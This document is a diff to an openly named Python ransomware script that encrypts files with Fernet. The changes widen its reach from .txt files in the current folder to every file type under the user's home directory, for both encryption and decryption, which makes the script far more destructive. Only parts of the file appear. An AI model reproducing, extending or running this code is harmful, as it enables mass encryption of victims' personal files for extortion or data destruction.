@@ -1,4 +1,5 @@
 import os
+import argparse
 from os.path import expanduser
 from cryptography.fernet import Fernet
 
@@ -6,7 +7,7 @@ class Ransomware(object):
     def __init__(self):
         self.key = None                 # Key to encrypt the files
         self.cryptor = None             # Object that does the actual encryption
-        self.file_ext_targets = ['txt'] # Type of files, you're going to encrypt 
+        self.file_ext_targets = ['*']   # Type of files, you're going to encrypt, '*' means everything
 
     def generate_key(self):
         # Generate the initial key, to unlock files, and pass it to the crypter
@@ -56,10 +57,9 @@ class Ransomware(object):
 
 
 if __name__ == "__main__":
-    # sys_root = expanduser("~")    # Use to encrypt every folder from root
-    local_root = "."                # Use to encrypt specific folder
+    sys_root = expanduser("~")      # Use to encrypt every folder from root
+    # local_root = "."              # Use to encrypt specific folder
 
-    import argparse
     parser = argparse.ArgumentParser()
     parser.add_argument("--action", required=True)
     parser.add_argument("--keyfile")
@@ -75,11 +75,11 @@ if __name__ == "__main__":
             print("Path to keyfile must be specified after --keyfile for decryption")
         else:
             ransom.read_key(keyfile)
-            ransom.crypt_root(local_root, encrypted=True)
+            ransom.crypt_root(sys_root, encrypted=True)
     elif action == "encrypt":
         ransom.generate_key()
         ransom.write_key("keyfile")
-        ransom.crypt_root(local_root)
+        ransom.crypt_root(sys_root)
 
 # Run Examples: 
 # python3 ransom.py --action encrypt
